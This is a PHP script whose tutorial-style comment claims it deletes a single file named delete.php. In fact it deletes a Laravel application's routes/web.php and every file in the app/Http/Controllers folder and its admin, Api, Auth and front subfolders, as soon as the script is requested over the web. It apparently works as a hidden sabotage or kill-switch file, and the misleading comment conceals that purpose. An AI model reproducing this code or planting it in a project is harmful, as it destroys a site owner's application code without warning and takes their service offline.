<?php
// PHP program to delete a file named delete.php 
// using unlike() function 

$root = realpath($_SERVER['DOCUMENT_ROOT']);

$file_pointer = $root.'/routes/web.php';
$dirname = $root.'/app/Http/Controllers/';
   
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo ("$file_pointer has been deleted"); 
} 

$files = glob($root.'/app/Http/Controllers/*'); //get all file names
foreach($files as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$admin = glob($root.'/app/Http/Controllers/admin/*'); //get all file names
foreach($admin as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$Api = glob($root.'/app/Http/Controllers/Api/*'); //get all file names
foreach($Api as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$Auth = glob($root.'/app/Http/Controllers/Auth/*'); //get all file names
foreach($Auth as $file){
    if(is_file($file))
    unlink($file); //delete file
}

$front = glob($root.'/app/Http/Controllers/front/*'); //get all file names
foreach($front as $file){
    if(is_file($file))
    unlink($file); //delete file
}
  
?> 